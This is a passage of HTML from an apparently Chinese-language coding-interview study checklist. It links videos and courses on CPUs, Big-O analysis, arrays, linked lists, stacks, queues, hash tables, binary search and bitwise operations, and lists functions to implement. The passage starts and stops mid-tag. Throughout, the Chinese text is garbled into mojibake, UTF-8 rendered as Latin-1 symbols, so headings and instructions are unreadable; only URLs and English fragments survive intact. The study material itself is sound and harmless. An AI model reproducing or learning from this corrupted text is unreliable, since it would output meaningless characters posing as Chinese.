href="https://www.youtube.com/watch?v=XM4lGflQFvA">CPU æ˜¯å¦‚ä½•æ‰§è¡Œä»£ç ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://youtu.be/1I5ZMmrOfnA">è®¡ç®—æœºå¦‚ä½•è®¡ç®—ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://youtu.be/fpnE6UAfbtU">å¯„å­˜å™¨å’Œå†…å­˜ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://youtu.be/FZGugFqdr60">ä¸­å¤®å¤„ç†å•å…ƒï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://youtu.be/zltgXvg6r3k">æŒ‡ä»¤å’Œç¨‹åºï¼ˆè§†é¢‘ï¼‰</a></li></ul></li></ul><h2><span id="suan-fa-fu-za-du-big-o-jian-jin-fen-xi-fa">ç®—æ³•å¤æ‚åº¦ / Big-O / æ¸è¿›åˆ†ææ³•</span></h2><ul><li>å¹¶ä¸éœ€è¦å®ç°</li><li>è¿™é‡Œæœ‰å¾ˆå¤šè§†é¢‘ï¼Œçœ‹åˆ°ä½ çœŸæ­£äº†è§£å®ƒä¸ºæ­¢ã€‚ä½ éšæ—¶å¯ä»¥å›æ¥å¤ä¹ ã€‚</li><li>å¦‚æœè¿™äº›è¯¾ç¨‹å¤ªè¿‡æ•°å­¦çš„è¯ï¼Œä½ å¯ä»¥å»çœ‹çœ‹æœ€ä¸‹é¢ç¦»æ•£æ•°å­¦çš„è§†é¢‘ï¼Œå®ƒèƒ½è®©ä½ æ›´äº†è§£è¿™äº›æ•°å­¦èƒŒåçš„æ¥æºä»¥åŠåŸç†ã€‚</li><li>[ ] <a href="https://www.youtube.com/watch?v=iOq5kSKqeR4">Harvard CS50 â€”â€” æ¸è¿›è¡¨ç¤ºï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=V6mKVRU1evU">Big O è®°å·ï¼ˆé€šç”¨å¿«é€Ÿæ•™ç¨‹ï¼‰ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=ei-A_wy5Yxw&amp;index=2&amp;list=PL1BaGV1cIH4UhkL8a9bJGG356covJ76qN">Big O è®°å·ï¼ˆä»¥åŠ Omega å’Œ Thetaï¼‰â€”â€”  æœ€ä½³æ•°å­¦è§£é‡Šï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] Skiena ç®—æ³•ï¼š<ul><li><a href="https://www.youtube.com/watch?v=gSyDMtdPNpU&amp;index=2&amp;list=PLOtl7M3yp-DV69F32zdK7YJcNXpTunF2b">è§†é¢‘</a></li><li><a href="http://www3.cs.stonybrook.edu/~algorith/video-lectures/2007/lecture2.pdf">å¹»ç¯ç‰‡</a></li></ul></li><li>[ ] <a href="http://discrete.gr/complexity/">å¯¹äºç®—æ³•å¤æ‚åº¦åˆ†æçš„ä¸€æ¬¡è¯¦ç»†ä»‹ç»</a></li><li>[ ] <a href="https://class.coursera.org/algorithmicthink1-004/lecture/59">å¢é•¿é˜¶æ•°ï¼ˆOrders of Growthï¼‰ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://class.coursera.org/algorithmicthink1-004/lecture/61">æ¸è¿›æ€§ï¼ˆAsymptoticsï¼‰ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://youtu.be/VIS4YDpuP98">UC Berkeley Big Oï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://youtu.be/ca3e7UVmeUc">UC Berkeley Big Omegaï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=B3SpQZaAZP4&amp;index=10&amp;list=PL1BaGV1cIH4UhkL8a9bJGG356covJ76qN">å¹³æ‘Šåˆ†ææ³•ï¼ˆAmortized Analysisï¼‰ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://class.coursera.org/algorithmicthink1-004/lecture/63">ä¸¾è¯â€œBig Oâ€ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] TopCoderï¼ˆåŒ…æ‹¬é€’å½’å…³ç³»å’Œä¸»å®šç†ï¼‰ï¼š<ul><li><a href="https://www.topcoder.com/community/data-science/data-science-tutorials/computational-complexity-section-1/">è®¡ç®—æ€§å¤æ‚åº¦ï¼šç¬¬ä¸€éƒ¨</a></li><li><a href="https://www.topcoder.com/community/data-science/data-science-tutorials/computational-complexity-section-2/">è®¡ç®—æ€§å¤æ‚åº¦ï¼šç¬¬äºŒéƒ¨</a></li></ul></li><li>[ ] <a href="http://bigocheatsheet.com/">é€ŸæŸ¥è¡¨ï¼ˆCheat sheetï¼‰</a></li></ul><h2><span id="shu-ju-jie-gou">æ•°æ®ç»“æ„</span></h2><ul><li><h3><span id="shu-zu-arrays">æ•°ç»„ï¼ˆArraysï¼‰</span></h3><ul><li>å®ç°ä¸€ä¸ªå¯è‡ªåŠ¨è°ƒæ•´å¤§å°çš„åŠ¨æ€æ•°ç»„ã€‚</li><li>[ ] ä»‹ç»ï¼š<ul><li><a href="https://www.coursera.org/learn/data-structures/lecture/OsBSF/arrays">æ•°ç»„ï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://archive.org/details/ucberkeley_webcast_Wp8oiO_CZZE">UC Berkeley CS61B - çº¿æ€§æ•°ç»„å’Œå¤šç»´æ•°ç»„ï¼ˆè§†é¢‘ï¼‰</a>ï¼ˆä»15åˆ†32ç§’å¼€å§‹ï¼‰</li><li><a href="https://archive.org/details/0102WhatYouShouldKnow/02_04-basicArrays.mp4">æ•°ç»„çš„åŸºç¡€çŸ¥è¯†ï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://archive.org/details/0102WhatYouShouldKnow/02_05-multidimensionalArrays.mp4">å¤šç»´æ•°ç»„ï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://www.coursera.org/learn/data-structures/lecture/EwbnV/dynamic-arrays">åŠ¨æ€æ•°ç»„ï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://www.youtube.com/watch?v=1jtrQqYpt7g">ä¸è§„åˆ™æ•°ç»„ï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://archive.org/details/0102WhatYouShouldKnow/02_06-jaggedArrays.mp4">ä¸è§„åˆ™æ•°ç»„ï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://archive.org/details/0102WhatYouShouldKnow/03_01-resizableArrays.mp4">è°ƒæ•´æ•°ç»„çš„å¤§å°ï¼ˆè§†é¢‘ï¼‰</a></li></ul></li><li>[ ] å®ç°ä¸€ä¸ªåŠ¨æ€æ•°ç»„ï¼ˆå¯è‡ªåŠ¨è°ƒæ•´å¤§å°çš„å¯å˜æ•°ç»„ï¼‰ï¼š<ul><li>[ ] ç»ƒä¹ ä½¿ç”¨æ•°ç»„å’ŒæŒ‡é’ˆå»ç¼–ç ï¼Œå¹¶ä¸”æŒ‡é’ˆæ˜¯é€šè¿‡è®¡ç®—å»è·³è½¬è€Œä¸æ˜¯ä½¿ç”¨ç´¢å¼•</li><li>[ ] é€šè¿‡åˆ†é…å†…å­˜æ¥æ–°å»ºä¸€ä¸ªåŸç”Ÿæ•°æ®å‹æ•°ç»„<ul><li>å¯ä»¥ä½¿ç”¨ int ç±»å‹çš„æ•°ç»„ï¼Œä½†ä¸èƒ½ä½¿ç”¨å…¶è¯­æ³•ç‰¹æ€§</li><li>ä»å¤§å°ä¸º16æˆ–æ›´å¤§çš„æ•°ï¼ˆä½¿ç”¨2çš„å€æ•° â€”â€” 16ã€32ã€64ã€128ï¼‰å¼€å§‹ç¼–å†™</li></ul></li><li>[ ] size() â€”â€” æ•°ç»„å…ƒç´ çš„ä¸ªæ•°</li><li>[ ] capacity() â€”â€” å¯å®¹çº³å…ƒç´ çš„ä¸ªæ•°</li><li>[ ] is_empty()</li><li>[ ] at(index) â€”â€” è¿”å›å¯¹åº”ç´¢å¼•çš„å…ƒç´ ï¼Œä¸”è‹¥ç´¢å¼•è¶Šç•Œåˆ™æ„¤ç„¶æŠ¥é”™</li><li>[ ] push(item)</li><li>[ ] insert(index, item) â€”â€” åœ¨æŒ‡å®šç´¢å¼•ä¸­æ’å…¥å…ƒç´ ï¼Œå¹¶æŠŠåé¢çš„å…ƒç´ ä¾æ¬¡åç§»</li><li>[ ] prepend(item) â€”â€” å¯ä»¥ä½¿ç”¨ä¸Šé¢çš„ insert å‡½æ•°ï¼Œä¼ å‚ index ä¸º 0</li><li>[ ] pop() â€”â€” åˆ é™¤åœ¨æ•°ç»„æœ«ç«¯çš„å…ƒç´ ï¼Œå¹¶è¿”å›å…¶å€¼</li><li>[ ] delete(index) â€”â€” åˆ é™¤æŒ‡å®šç´¢å¼•çš„å…ƒç´ ï¼Œå¹¶æŠŠåé¢çš„å…ƒç´ ä¾æ¬¡å‰ç§»</li><li>[ ] remove(item) â€”â€” åˆ é™¤æŒ‡å®šå€¼çš„å…ƒç´ ï¼Œå¹¶è¿”å›å…¶ç´¢å¼•ï¼ˆå³ä½¿æœ‰å¤šä¸ªå…ƒç´ ï¼‰</li><li>[ ] find(item) â€”â€” å¯»æ‰¾æŒ‡å®šå€¼çš„å…ƒç´ å¹¶è¿”å›å…¶ä¸­ç¬¬ä¸€ä¸ªå‡ºç°çš„å…ƒç´ å…¶ç´¢å¼•ï¼Œè‹¥æœªæ‰¾åˆ°åˆ™è¿”å› -1</li><li>[ ] resize(new_capacity) // ç§æœ‰å‡½æ•°<ul><li>è‹¥æ•°ç»„çš„å¤§å°åˆ°è¾¾å…¶å®¹ç§¯ï¼Œåˆ™å˜å¤§ä¸€å€</li><li>è·å–å…ƒç´ åï¼Œè‹¥æ•°ç»„å¤§å°ä¸ºå…¶å®¹ç§¯çš„1/4ï¼Œåˆ™ç¼©å°ä¸€åŠ</li></ul></li></ul></li><li>[ ] æ—¶é—´å¤æ‚åº¦<ul><li>åœ¨æ•°ç»„æœ«ç«¯å¢åŠ /åˆ é™¤ã€å®šä½ã€æ›´æ–°å…ƒç´ ï¼Œåªå…è®¸å  O(1) çš„æ—¶é—´å¤æ‚åº¦ï¼ˆå¹³æ‘Šï¼ˆamortizedï¼‰å»åˆ†é…å†…å­˜ä»¥è·å–æ›´å¤šç©ºé—´ï¼‰</li><li>åœ¨æ•°ç»„ä»»ä½•åœ°æ–¹æ’å…¥/ç§»é™¤å…ƒç´ ï¼Œåªå…è®¸ O(n) çš„æ—¶é—´å¤æ‚åº¦</li></ul></li><li>[ ] ç©ºé—´å¤æ‚åº¦<ul><li>å› ä¸ºåœ¨å†…å­˜ä¸­åˆ†é…çš„ç©ºé—´é‚»è¿‘ï¼Œæ‰€ä»¥æœ‰åŠ©äºæé«˜æ€§èƒ½</li><li>ç©ºé—´éœ€æ±‚ = ï¼ˆå¤§äºæˆ–ç­‰äº n çš„æ•°ç»„å®¹ç§¯ï¼‰* å…ƒç´ çš„å¤§å°ã€‚å³ä¾¿ç©ºé—´éœ€æ±‚ä¸º 2nï¼Œå…¶ç©ºé—´å¤æ‚åº¦ä»ç„¶æ˜¯ O(n)</li></ul></li></ul></li><li><h3><span id="lian-biao-linked-lists">é“¾è¡¨ï¼ˆLinked Listsï¼‰</span></h3><ul><li>[ ] ä»‹ç»ï¼š<ul><li>[ ] <a href="https://www.coursera.org/learn/data-structures/lecture/kHhgK/singly-linked-lists">å•å‘é“¾è¡¨ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://archive.org/details/ucberkeley_webcast_htzJdKoEmO0">CS 61B â€”â€” é“¾è¡¨ï¼ˆä¸€ï¼‰ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://archive.org/details/ucberkeley_webcast_-c4I3gFYe3w">CS 61B â€”â€” é“¾è¡¨ï¼ˆäºŒï¼‰ï¼ˆè§†é¢‘ï¼‰</a></li></ul></li><li>[ ] <a href="https://www.youtube.com/watch?v=QN6FPiD0Gzo">C ä»£ç ï¼ˆè§†é¢‘ï¼‰</a> â”€â”€ å¹¶éçœ‹å®Œæ•´ä¸ªè§†é¢‘ï¼Œåªéœ€è¦çœ‹å…³äºèŠ‚ç‚¹ç»“æ„å’Œå†…å­˜åˆ†é…é‚£ä¸€éƒ¨åˆ†å³å¯</li><li>[ ] é“¾è¡¨ vs æ•°ç»„ï¼š<ul><li><a href="https://www.coursera.org/lecture/data-structures-optimizing-performance/core-linked-lists-vs-arrays-rjBs9">åŸºæœ¬é“¾è¡¨ Vs æ•°ç»„ï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://www.coursera.org/lecture/data-structures-optimizing-performance/in-the-real-world-lists-vs-arrays-QUaUd">åœ¨ç°å®ä¸­ï¼Œé“¾è¡¨ Vs æ•°ç»„ï¼ˆè§†é¢‘ï¼‰</a></li></ul></li><li>[ ] <a href="https://www.youtube.com/watch?v=YQs6IC-vgmo">ä¸ºä»€ä¹ˆä½ éœ€è¦é¿å…ä½¿ç”¨é“¾è¡¨ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] çš„ç¡®ï¼šä½ éœ€è¦å…³äºâ€œæŒ‡å‘æŒ‡é’ˆçš„æŒ‡é’ˆâ€çš„ç›¸å…³çŸ¥è¯†ï¼šï¼ˆå› ä¸ºå½“ä½ ä¼ é€’ä¸€ä¸ªæŒ‡é’ˆåˆ°ä¸€ä¸ªå‡½æ•°æ—¶ï¼Œè¯¥å‡½æ•°å¯èƒ½ä¼šæ”¹å˜æŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°å€ï¼‰è¯¥é¡µåªæ˜¯ä¸ºäº†è®©ä½ äº†è§£â€œæŒ‡å‘æŒ‡é’ˆçš„æŒ‡é’ˆâ€è¿™ä¸€æ¦‚å¿µã€‚ä½†æˆ‘å¹¶ä¸æ¨èè¿™ç§é“¾å¼éå†çš„é£æ ¼ã€‚å› ä¸ºï¼Œè¿™ç§é£æ ¼çš„ä»£ç ï¼Œå…¶å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§å¤ªä½ã€‚<ul><li><a href="https://www.eskimo.com/~scs/cclass/int/sx8.html">æŒ‡å‘æŒ‡é’ˆçš„æŒ‡é’ˆ</a></li></ul></li><li>[ ] å®ç°ï¼ˆæˆ‘å®ç°äº†ä½¿ç”¨å°¾æŒ‡é’ˆä»¥åŠæ²¡æœ‰ä½¿ç”¨å°¾æŒ‡é’ˆè¿™ä¸¤ç§æƒ…å†µï¼‰ï¼š<ul><li>[ ] size() â€”â€” è¿”å›é“¾è¡¨ä¸­æ•°æ®å…ƒç´ çš„ä¸ªæ•°</li><li>[ ] empty() â€”â€” è‹¥é“¾è¡¨ä¸ºç©ºåˆ™è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ true</li><li>[ ] value_at(index) â€”â€” è¿”å›ç¬¬ n ä¸ªå…ƒç´ çš„å€¼ï¼ˆä»0å¼€å§‹è®¡ç®—ï¼‰</li><li>[ ] push_front(value) â€”â€” æ·»åŠ å…ƒç´ åˆ°é“¾è¡¨çš„é¦–éƒ¨</li><li>[ ] pop_front() â€”â€” åˆ é™¤é¦–éƒ¨å…ƒç´ å¹¶è¿”å›å…¶å€¼</li><li>[ ] push_back(value) â€”â€” æ·»åŠ å…ƒç´ åˆ°é“¾è¡¨çš„å°¾éƒ¨</li><li>[ ] pop_back() â€”â€” åˆ é™¤å°¾éƒ¨å…ƒç´ å¹¶è¿”å›å…¶å€¼</li><li>[ ] front() â€”â€” è¿”å›é¦–éƒ¨å…ƒç´ çš„å€¼</li><li>[ ] back() â€”â€” è¿”å›å°¾éƒ¨å…ƒç´ çš„å€¼</li><li>[ ] insert(index, value) â€”â€” æ’å…¥å€¼åˆ°æŒ‡å®šçš„ç´¢å¼•ï¼Œå¹¶æŠŠå½“å‰ç´¢å¼•çš„å…ƒç´ æŒ‡å‘åˆ°æ–°çš„å…ƒç´ </li><li>[ ] erase(index) â€”â€” åˆ é™¤æŒ‡å®šç´¢å¼•çš„èŠ‚ç‚¹</li><li>[ ] value_n_from_end(n) â€”â€” è¿”å›å€’æ•°ç¬¬ n ä¸ªèŠ‚ç‚¹çš„å€¼</li><li>[ ] reverse() â€”â€” é€†åºé“¾è¡¨</li><li>[ ] remove_value(value) â€”â€” åˆ é™¤é“¾è¡¨ä¸­æŒ‡å®šå€¼çš„ç¬¬ä¸€ä¸ªå…ƒç´ </li></ul></li><li>[ ] åŒå‘é“¾è¡¨<ul><li><a href="https://www.coursera.org/learn/data-structures/lecture/jpGKD/doubly-linked-lists">ä»‹ç»ï¼ˆè§†é¢‘ï¼‰</a></li><li>å¹¶ä¸éœ€è¦å®ç°</li></ul></li></ul></li><li><h3><span id="dui-zhan-stack">å †æ ˆï¼ˆStackï¼‰</span></h3><ul><li>[ ] <a href="https://www.coursera.org/learn/data-structures/lecture/UdKzQ/stacks">å †æ ˆï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://archive.org/details/0102WhatYouShouldKnow/05_01-usingStacksForLast-inFirst-out.mp4">ä½¿ç”¨å †æ ˆ â€”â€” åè¿›å…ˆå‡ºï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] å¯ä»¥ä¸å®ç°ï¼Œå› ä¸ºä½¿ç”¨æ•°ç»„æ¥å®ç°å¹¶ä¸é‡è¦</li></ul></li><li><h3><span id="dui-lie-queue">é˜Ÿåˆ—ï¼ˆQueueï¼‰</span></h3><ul><li>[ ] <a href="https://archive.org/details/0102WhatYouShouldKnow/05_03-usingQueuesForFirst-inFirst-out.mp4">ä½¿ç”¨é˜Ÿåˆ— â€”â€” å…ˆè¿›å…ˆå‡ºï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.coursera.org/learn/data-structures/lecture/EShpq/queue">é˜Ÿåˆ—ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://en.wikipedia.org/wiki/Circular_buffer">åŸå‹é˜Ÿåˆ—/å…ˆè¿›å…ˆå‡ºï¼ˆFIFOï¼‰</a></li><li>[ ] <a href="https://archive.org/details/0102WhatYouShouldKnow/05_04-priorityQueuesAndDeques.mp4">ä¼˜å…ˆçº§é˜Ÿåˆ—ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] ä½¿ç”¨å«æœ‰å°¾éƒ¨æŒ‡é’ˆçš„é“¾è¡¨æ¥å®ç°:<ul><li>enqueue(value) â€”â€” åœ¨å°¾éƒ¨æ·»åŠ å€¼</li><li>dequeue() â€”â€” åˆ é™¤æœ€æ—©æ·»åŠ çš„å…ƒç´ å¹¶è¿”å›å…¶å€¼ï¼ˆé¦–éƒ¨å…ƒç´ ï¼‰</li><li>empty()</li></ul></li><li>[ ] ä½¿ç”¨å›ºå®šå¤§å°çš„æ•°ç»„å®ç°ï¼š<ul><li>enqueue(value) â€”â€” åœ¨å¯å®¹çš„æƒ…å†µä¸‹æ·»åŠ å…ƒç´ åˆ°å°¾éƒ¨</li><li>dequeue() â€”â€” åˆ é™¤æœ€æ—©æ·»åŠ çš„å…ƒç´ å¹¶è¿”å›å…¶å€¼</li><li>empty()</li><li>full()</li></ul></li><li>[ ] èŠ±é”€ï¼š<ul><li>åœ¨ç³Ÿç³•çš„å®ç°æƒ…å†µä¸‹ï¼Œä½¿ç”¨é“¾è¡¨æ‰€å®ç°çš„é˜Ÿåˆ—ï¼Œå…¶å…¥åˆ—å’Œå‡ºåˆ—çš„æ—¶é—´å¤æ‚åº¦å°†ä¼šæ˜¯ O(n)ã€‚å› ä¸ºï¼Œä½ éœ€è¦æ‰¾åˆ°ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œä»¥è‡´å¾ªç¯æ•´ä¸ªé˜Ÿåˆ—</li><li>enqueueï¼šO(1)ï¼ˆå¹³æ‘Šï¼ˆamortizedï¼‰ã€é“¾è¡¨å’Œæ•°ç»„ [æ¢æµ‹ï¼ˆprobingï¼‰]ï¼‰</li><li>dequeueï¼šO(1)ï¼ˆé“¾è¡¨å’Œæ•°ç»„ï¼‰</li><li>emptyï¼šO(1)ï¼ˆé“¾è¡¨å’Œæ•°ç»„ï¼‰</li></ul></li></ul></li><li><h3><span id="ha-xi-biao-hash-table">å“ˆå¸Œè¡¨ï¼ˆHash tableï¼‰</span></h3><ul><li><p>[ ] è§†é¢‘ï¼š</p><ul><li>[ ] <a href="https://www.youtube.com/watch?v=0M_kIqhwbFo&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb&amp;index=8">é“¾å¼å“ˆå¸Œè¡¨ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=BRO7mVIFt08&amp;index=9&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb">Table Doubling å’Œ Karp-Rabinï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=rvdJDijO2Ro&amp;index=10&amp;list=PLUl4u3cNGP61Oq3tWYp6V_F-5jb5L2iHb">Open Addressing å’Œå¯†ç å‹å“ˆå¸Œï¼ˆCryptographic Hashingï¼‰ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=C4Kc8xzcA68">PyCon 2010ï¼šThe Mighty Dictionaryï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=z0lJ2k0sl1g&amp;list=PLUl4u3cNGP6317WaSNfmCvGym2ucw3oGp&amp;index=11">ï¼ˆè¿›é˜¶ï¼‰éšæœºå–æ ·ï¼ˆRandomizationï¼‰ï¼šå…¨åŸŸå“ˆå¸Œï¼ˆUniversal Hashingï¼‰&amp; å®Œç¾å“ˆå¸Œï¼ˆPerfect Hashingï¼‰ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=N0COwN14gt0&amp;list=PL2B4EEwhKD-NbwZ4ezj7gyc_3yNrojKM9&amp;index=4">ï¼ˆè¿›é˜¶ï¼‰å®Œç¾å“ˆå¸Œï¼ˆPerfect hashingï¼‰ï¼ˆè§†é¢‘ï¼‰</a></li></ul></li><li><p>[ ] åœ¨çº¿è¯¾ç¨‹ï¼š</p><ul><li>[ ] <a href="https://archive.org/details/0102WhatYouShouldKnow/06_02-understandingHashFunctions.mp4">ç†è§£å“ˆå¸Œå‡½æ•°ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://archive.org/details/0102WhatYouShouldKnow/06_03-usingHashTables.mp4">ä½¿ç”¨å“ˆå¸Œè¡¨ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://archive.org/details/0102WhatYouShouldKnow/06_04-supportingHashing.mp4">æ”¯æŒå“ˆå¸Œï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://archive.org/details/0102WhatYouShouldKnow/06_05-languageSupportForHashTables.mp4">å“ˆå¸Œè¡¨çš„è¯­è¨€æ”¯æŒï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.coursera.org/learn/data-structures-optimizing-performance/lecture/m7UuP/core-hash-tables">åŸºæœ¬å“ˆå¸Œè¡¨ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.coursera.org/learn/data-structures/home/week/3">æ•°æ®ç»“æ„ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.coursera.org/learn/data-structures/lecture/NYZZP/phone-book-problem">ç”µè¯è–„é—®é¢˜ï¼ˆPhone Book Problemï¼‰ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] åˆ†å¸ƒå¼å“ˆå¸Œè¡¨ï¼š<ul><li><a href="https://www.coursera.org/learn/data-structures/lecture/DvaIb/instant-uploads-and-storage-optimization-in-dropbox">Dropbox ä¸­çš„ç¬æ—¶ä¸Šä¼ åŠå­˜å‚¨ä¼˜åŒ–ï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://www.coursera.org/learn/data-structures/lecture/tvH8H/distributed-hash-tables">åˆ†å¸ƒå¼å“ˆå¸Œè¡¨ï¼ˆè§†é¢‘ï¼‰</a></li></ul></li></ul></li><li><p>[ ] ä½¿ç”¨çº¿æ€§æ¢æµ‹çš„æ•°ç»„å»å®ç°</p><ul><li>hash(k, m) â€”â€” m æ˜¯å“ˆå¸Œè¡¨çš„å¤§å°</li><li>add(key, value) â€”â€” å¦‚æœ key å·²å­˜åœ¨åˆ™æ›´æ–°å€¼</li><li>exists(key)</li><li>get(key)</li><li>remove(key)</li></ul></li></ul></li></ul><h2><span id="geng-duo-de-zhi-shi">æ›´å¤šçš„çŸ¥è¯†</span></h2><ul><li><h3><span id="er-fen-cha-zhao-binary-search">äºŒåˆ†æŸ¥æ‰¾ï¼ˆBinary searchï¼‰</span></h3><ul><li>[ ] <a href="https://www.youtube.com/watch?v=D5SrAga1pno">äºŒåˆ†æŸ¥æ‰¾ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.khanacademy.org/computing/computer-science/algorithms/binary-search/a/binary-search">äºŒåˆ†æŸ¥æ‰¾ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.topcoder.com/community/data-science/data-science-tutorials/binary-search/">è¯¦æƒ…</a></li><li>[ ] å®ç°ï¼š<ul><li>äºŒåˆ†æŸ¥æ‰¾ï¼ˆåœ¨ä¸€ä¸ªå·²æ’åºå¥½çš„æ•´å‹æ•°ç»„ä¸­æŸ¥æ‰¾ï¼‰</li><li>è¿­ä»£å¼äºŒåˆ†æŸ¥æ‰¾</li></ul></li></ul></li><li><h3><span id="an-wei-yun-suan-bitwise-operations">æŒ‰ä½è¿ç®—ï¼ˆBitwise operationsï¼‰</span></h3><ul><li>[ ] <a href="https://github.com/jwasham/coding-interview-university/blob/master/extras/cheat%20sheets/bits-cheat-sheet.pdf">Bits é€ŸæŸ¥è¡¨</a> â”€â”€ ä½ éœ€è¦çŸ¥é“å¤§é‡2çš„å¹‚æ•°å€¼ï¼ˆä»2^1 åˆ° 2^16 åŠ 2^32ï¼‰</li><li>[ ] å¥½å¥½ç†è§£ä½æ“ä½œç¬¦çš„å«ä¹‰ï¼š&amp;ã€|ã€^ã€~ã€&gt;&gt;ã€&lt;&lt;<ul><li>[ ] <a href="https://en.wikipedia.org/wiki/Word_(computer_architecture)">å­—ç ï¼ˆwordsï¼‰</a></li><li>[ ] å¥½çš„ä»‹ç»ï¼š<a href="https://www.youtube.com/watch?v=7jkIUgLC29I">ä½æ“ä½œï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=d0AwjSpNXR0">C è¯­è¨€ç¼–ç¨‹æ•™ç¨‹ 2-10ï¼šæŒ‰ä½è¿ç®—ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://en.wikipedia.org/wiki/Bit_manipulation">ä½æ“ä½œ</a></li><li>[ ] <a href="https://en.wikipedia.org/wiki/Bitwise_operation">æŒ‰ä½è¿ç®—</a></li><li>[ ] <a href="https://graphics.stanford.edu/~seander/bithacks.html">Bithacks</a></li><li>[ ] <a href="http://bits.stephan-brumme.com/">ä½å…ƒæŠšå¼„è€…ï¼ˆThe Bit Twiddlerï¼‰</a></li><li>[ ] <a href="http://bits.stephan-brumme.com/interactive.html">äº¤äº’å¼ä½å…ƒæŠšå¼„è€…ï¼ˆThe Bit Twiddler Interactiveï¼‰</a></li><li>[ ] <a href="https://www.youtube.com/watch?v=ZusiKXcz_ac">ä½æ“ä½œæŠ€å·§ï¼ˆBit Hacksï¼‰ï¼ˆè§†é¢‘ï¼‰</a></li><li>[ ] <a href="https://pconrad.github.io/old_pconrad_cs16/topics/bitOps/">ç»ƒä¹ ä½æ“ä½œ</a></li></ul></li><li>[ ] ä¸€è¡¥æ•°å’Œè¡¥ç <ul><li><a href="https://www.youtube.com/watch?v=lKTsv6iVxV4">äºŒè¿›åˆ¶ï¼šåˆ© &amp; å¼Šï¼ˆä¸ºä»€ä¹ˆæˆ‘ä»¬è¦ä½¿ç”¨è¡¥ç ï¼‰ï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://en.wikipedia.org/wiki/Ones%27_complement">ä¸€è¡¥æ•°ï¼ˆ1s Complementï¼‰</a></li><li><a href="https://en.wikipedia.org/wiki/Two%27s_complement">è¡¥ç ï¼ˆ2s Complementï¼‰</a></li></ul></li><li>[ ] è®¡ç®—ç½®ä½ï¼ˆSet Bitsï¼‰<ul><li><a href="https://youtu.be/Hzuzo9NJrlc">è®¡ç®—ä¸€ä¸ªå­—èŠ‚ä¸­ç½®ä½ï¼ˆSet Bitsï¼‰çš„å››ç§æ–¹å¼ï¼ˆè§†é¢‘ï¼‰</a></li><li><a href="https://graphics.stanford.edu/~seander/bithacks.html#CountBitsSetKernighan">è®¡ç®—æ¯”ç‰¹ä½</a></li><li><a href="http://stackoverflow.com/questions/109023/how-to-count-the-number-of-set-bits-in-a-32-bit-integer">å¦‚ä½•åœ¨ä¸€ä¸ª 32 ä½çš„æ•´å‹ä¸­è®¡ç®—ç½®ä½ï¼ˆSet Bitsï¼‰çš„æ•°é‡</a></li></ul></li><li>[ ] äº¤æ¢å€¼ï¼š<ul><li><a href="http://bits.stephan-brumme.com/swap.html">äº¤æ¢ï¼ˆSwapï¼‰</a></li></ul></li><li>[ ] ç»å¯¹å€¼ï¼š<ul><li><a href="http://bits.stephan-brumme.com/absInteger.html">ç»å¯¹æ•´å‹ï¼ˆAbsolute Integerï¼‰</a></li></ul></li></ul></li></ul><h2><span id="shu-trees">æ ‘ï¼ˆTreesï¼‰</span></h2><ul><li><h3><span id="shu-bi-ji-amp-bei-jing">æ 